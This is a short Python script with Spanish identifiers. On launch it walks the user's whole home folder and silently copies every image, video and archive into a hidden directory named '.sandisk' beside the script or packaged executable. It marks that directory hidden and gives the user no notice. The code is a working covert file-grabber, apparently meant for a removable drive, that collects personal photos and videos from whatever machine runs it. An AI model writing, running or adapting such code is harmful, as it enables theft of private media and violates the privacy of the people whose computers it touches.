import os
import sys
import shutil

def unir_listas_sin_duplicados(*listas):
    elementos_unicos = set()
    for lista in listas: elementos_unicos.update(lista)
    return list(elementos_unicos)

EXT_IMG = [
    '.jpg', '.jpeg', '.png', '.gif', '.bmp',
    '.tiff', '.tif', '.webp', '.svg', '.ico'
]

EXT_VID = [
    '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.webm', 
    '.mpg', '.mpeg', '.m4v', '.3gp', '.3g2', '.f4v', '.ogg'
]

EXT_COMP = [
    '.zip', '.rar', '.7z'
]

EXT_PRIO = unir_listas_sin_duplicados(EXT_IMG, EXT_VID, EXT_COMP)

USER_DIR = os.path.expanduser("~")
NOMBRE_CARPETA = '.sandisk'
if getattr(sys, 'frozen', False): COPY_DIR = os.path.join(os.path.dirname(sys.executable), NOMBRE_CARPETA)
else: COPY_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), NOMBRE_CARPETA)

TOL_MB_ARCH_PEQ = 10.0 #MB
TOL_MB_ARCH_GRA = 100.0 #MB
TOL_MB_ARCH_GIG = 500.0 #MB

def peso_archivo_MB(file_path):
    try: return os.path.getsize(file_path) / (1024 * 1024)
    except Exception : return -1.0

def copiar_archivo(source_file, target_file):
    try:
        shutil.copy(source_file, target_file)
        return True
    except Exception: return False

def extraer_archivos_por_extension(origen, destino, extensiones_extraibles):
    if not os.path.exists(destino): os.makedirs(destino)
    try: os.system(f'attrib +h "{destino}"')
    except Exception: pass

    archivo_error = os.path.join(destino, "errores.txt")
    archivos_errores = []

    archivos_grandes = {}
    archivos_gigantes = {}
    archivos_extremos = {}

    for root, _, files in os.walk(origen):
        for filename in files:
            _, ext = os.path.splitext(filename)
            ext = ext.lower()

            if ext in extensiones_extraibles:
                source_file = os.path.join(root, filename)

                target_dir = os.path.join(destino, ext[1:])
                if not os.path.exists(target_dir): os.makedirs(target_dir)

                target_file = os.path.join(target_dir, filename)
                size_file = peso_archivo_MB(source_file)

                if size_file > TOL_MB_ARCH_PEQ and size_file <= TOL_MB_ARCH_GRA:  archivos_grandes[source_file] = target_file
                elif size_file > TOL_MB_ARCH_GRA and size_file <= TOL_MB_ARCH_GIG:  archivos_gigantes[source_file] = target_file
                elif size_file > TOL_MB_ARCH_GIG:  archivos_extremos[source_file] = target_file
                else:
                    if not copiar_archivo(source_file, target_file): archivos_errores.append(source_file)

    for source_file, target_file in archivos_grandes.items():
        if not copiar_archivo(source_file, target_file): archivos_errores.append(source_file)
    for source_file, target_file in archivos_gigantes.items():
        if not copiar_archivo(source_file, target_file): archivos_errores.append(source_file)
    for source_file, target_file in archivos_extremos.items():
        if not copiar_archivo(source_file, target_file): archivos_errores.append(source_file)

    if archivos_errores:
        with open(archivo_error, 'w') as f:
            for error in archivos_errores:
                f.write(error + '\n')

extraer_archivos_por_extension(USER_DIR, COPY_DIR, EXT_PRIO)
